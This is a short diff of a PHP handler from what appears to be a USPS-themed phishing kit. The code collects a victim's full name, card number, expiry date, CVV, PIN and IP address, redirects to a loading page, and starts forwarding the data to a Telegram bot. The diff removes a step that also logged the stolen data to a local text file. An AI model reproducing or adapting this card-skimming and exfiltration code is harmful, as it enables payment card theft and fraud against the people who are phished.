@@ -19,9 +19,7 @@ $C=$_POST['expr'];
 $ipp=$_SERVER['REMOTE_ADDR'];
 $message=">>>>>>>>>>>>>|jaw ja|<<<<<<<<<<<<"."\n"."Full name :  ".$F."\n"."CC Number :   ".$L."\n"."expr date :   ".$C."\n"."CVV :   ".$PH."\n"."Pin Code :   ".$pin."\n".$ipp."\n".">>>>>>>>>>>>>-USPS-<<<<<<<<<<<<";
 $user_ids=$id;
-$filee=fopen("../geni.txt",'a');
-fwrite($filee,$message."\n");
-fclose($filee);
+
 header("location: loading0.php");
 foreach($user_ids as $user_id) {
 $url='https://api.telegram.org/bot'.$token.'/sendMessage';
